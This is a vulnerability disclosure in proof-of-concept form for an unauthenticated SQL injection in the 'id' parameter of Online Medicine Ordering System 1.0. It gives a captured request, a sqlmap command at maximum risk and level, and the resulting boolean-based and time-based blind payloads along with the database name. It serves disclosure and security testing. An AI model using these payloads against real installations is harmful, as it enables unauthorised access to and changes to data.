# Online Medicine Ordering System - SQL Injection (Unauthenticated)
+ **Exploit Title:** Online Medicine Ordering System - SQL Injection (Unauthenticated)
+ **Date:** 2024-28-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/15359/online-medicine-ordering-system-phpoop-free-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=15359&title=Online+Medicine+Ordering+System+in+PHP%2FOOP+Free+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Online Medicine Ordering System 1.0 allows SQL Injection via the 'id' parameter in "/omos/?p=products/view_product&id=4". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database

## Proof of Concept:
+ Go to this address: "http://localhost/omos/?p=products"
+ Select any product
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /omos/?p=products/view_product&id=4 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=products/view_product&id=4' AND 8319=8319-- TGsD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=products/view_product&id=4' AND (SELECT 5923 FROM (SELECT(SLEEP(5)))BuVo)-- SeBw
---
[07:02:39] [INFO] testing MySQL
[07:02:40] [INFO] confirming MySQL
[07:02:40] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[07:02:40] [INFO] fetching current database
[07:02:40] [INFO] resumed: omos_db
current database: 'omos_db'
```
+ current database: `omos_db`


![Ekran görüntüsü 2024-01-31 151633](https://github.com/BurakSevben/CVEs/assets/117217689/e58cd2f9-fcc7-4e6a-a26f-0b0b54d38e8d)



